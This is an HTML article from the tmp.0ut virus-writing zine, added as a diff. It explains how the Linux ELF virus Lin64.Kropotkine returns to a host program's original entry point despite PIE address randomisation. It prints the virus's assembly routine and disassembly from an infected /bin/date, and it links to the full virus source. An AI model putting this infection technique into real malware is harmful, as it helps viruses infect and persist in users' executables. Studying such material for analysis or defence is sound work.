@@ -1,0 +1,157 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                           ┌───────────────────────┐
+                                                           ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                           │ █   █ █ █ █   █       │
+                                                           │ █   █ █ █ █▀▀▀▀       │
+                                                           │ █   █   █ █     ▄     │
+                                                           │                 ▄▄▄▄▄ │
+                                                           │                 █   █ │
+                                                           │                 █   █ │
+                                                           │                 █▄▄▄█ │
+                                                           │                 ▄   ▄ │
+                                                           │                 █   █ │
+                                                           │                 █   █ │
+                                                           │                 █▄▄▄█ │
+                                                           │                 ▄▄▄▄▄ │
+                                                           │                   █   │
+Return To Original Entry Point Despite PIE                 │                   █   │
+~ S01den                                                   └───────────────────█ ──┘
+
+Written with love by S01den, from the tmp.out crew !
+
+--- 1) Introduction ---
+
+When I took my first steps in the world of viruses, one of the first things I 
+struggled with was how to correctly return to the original entry point of the host.
+It's a core functionality of every virus worthy of the name, and was really easy to
+implement in the past (mov ebx, OEP ; jmp ebx).
+
+You might be wondering "Why it's not as easy anymore ?"
+
+The answer fits in 3 letters: PIE, standing for Position Independent Executable. In 
+such binaries, the addresses of instructions are randomized at every execution
+(despite an alignment). So the OEP isn't a constant anymore, we now have to 
+calculate it before being able to jump on.
+
+Let's see how do we do that !
+
+--- 2) Ret to OEP despite PIE ---
+
+I'll describe here the method I used to compute Ret2OEP in Lin64.Kropotkine[0].
+I was stuck some days and a paper of Elfmaster[1] showed me the light.
+
+So here is the code:
+
+-------------------------------- CUT-HERE ------------------------------------------
+mov rcx, r15 ;r15 holds the addr where the code of our vx is stored (in the stack)
+add rcx, VXSIZE ; rcx now contains the first addr after the code of the vx
+mov dword [rcx], 0xffffeee8 ; relative call to get_eip (which is 13 bytes before)
+mov dword [rcx+4], 0x0d2d48ff ; sub rax, (VXSIZE+5)
+mov byte  [rcx+8], 0x00000005
+mov word  [rcx+11], 0x0002d48
+mov qword [rcx+13], r9		 ; sub rax, entry0
+mov word  [rcx+17], 0x0000548
+mov qword [rcx+19], r12		; add rax, sym._start
+mov dword [rcx+23], 0xfff4894c 	; mov rsp, r14
+mov word  [rcx+27], 0x00e0		; jmp rax
+------------------------------------------------------------------------------------
+
+As you can see, we write the code to ret to OEP bytes per bytes, directly in
+memory (after the code of the virus, so that we can jump on this routine when 
+the previous viral code finished to execute) in the set of bytes we'll write 
+in the host to infect. We want to obtain something like this:
+
+(this code comes from my /bin/date which I infected with Lin64.Kropotkine)
+
+-------------------------------- CUT-HERE ------------------------------------------
+; end of the vx code:
+get_rip:
+0x0c01ada3      488b0424       mov rax, qword [rsp]
+0x0c01ada7      c3             ret
+getdot:
+0x0c01ada8      e842fbffff     call 0xc01a8ef          ; call main
+0x0c01adad      2e0000         add byte cs:[rax], al   ; '.'
+; &lt;---- end of the virus code, we want to inject our ret2OEP code here !
+; the code we want to have here:
+0x0c01adb0      e8eeffffff     call 0xc01ada3 ; call get_rip &lt;--
+0x0c01adb5      482d0d050000   sub rax, 0x50d ; sub rax, (VXSIZE+5)
+0x0c01adbb      482da8a8010c   sub rax, entry0
+0x0c01adc1      4805b0380000   add rax, 0x38b0 ;  add rax, sym._start
+0x0c01adc7      4c89f4         mov rsp, r14 ; to restore the orignal stack
+0x0c01adca      ffe0           jmp rax
+------------------------------------------------------------------------------------
+
+Basically, the idea for computing OEP is not really complicated.
+Let assume that the offset of the first instruction of the original code of the host
+to be executed (so the non-randomized OEP) is 0x38b0, and that RIP is currently
+0x55556156edb5 (a randomized address) when we call get_rip (0x0c01adb0 in the code 
+above). We want to know the randomized address of the OEP to be able to jump to it.
+
+Well, call get_rip put RIP in RAX, knowing that we first have to substract RAX
+(0x55556156edb5) to the size of the virus (plus 5, the size of the instruction call
+get_rip) to have the randomized address of the beginning of the virus code:
+
+---&gt; 0x55556156edb5 - (0x508 + 5) = 0x55556156e8a8 ; the address of the first
+instruction of the vx code
+
+Now, we substract this with the new entry point, the non-randomized address of the
+beginning of the virus code (which was computed before in the virus execution, 
+0xc01a8a8 in our case).
+
+In fact we simply do that:
+
+---&gt; randomized new entry point - non-randomized new entry point (e_hdr.entry)
+
+So with our values we get something like this:
+
+---&gt; 0x55556156e8a8 - 0xc01a8a8 = 0x555555554000
+
+We did this substraction to extract the "base" of randomization. With this value now
+in our hands, we just have to add it the original e_hdr.entry
+(the non-randomized OEP):
+
+---&gt; 0x555555554000 + 0x38b0 = 0x5555555578b0
+
+You obtain a correct address where you can jump !
+So jmp rax will start the execution of the original code of the host !
+
+--- Conclusion ---
+To sum up, we've just done something like this:
+
+---&gt; get_rip() - (VX_SIZE + 5) - new_EP + original-e_hdr.entry
+
+Quick maffs as you can see ! ;)
+Long live to the vx scene !
+Here there is authority, there is no freedom.
+All is for all.
+Hasta siempre!
+
+--- Notes and References ---
+[0] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[1] Modern ELF Infection Techniques of SCOP Binaries:
+    https://bitlackeys.org/papers/pocorgtfo20.pdf
+    - especially the part named: "Note on resolving Elf_Hdr-&gt;e_entry
+      in PIEexecutables"
+
+--- Source ---
+
+- <a href="Linux.Kropotkine.asm">Linux.Kropotkine.asm</a>
+</pre></div></center></body></html>
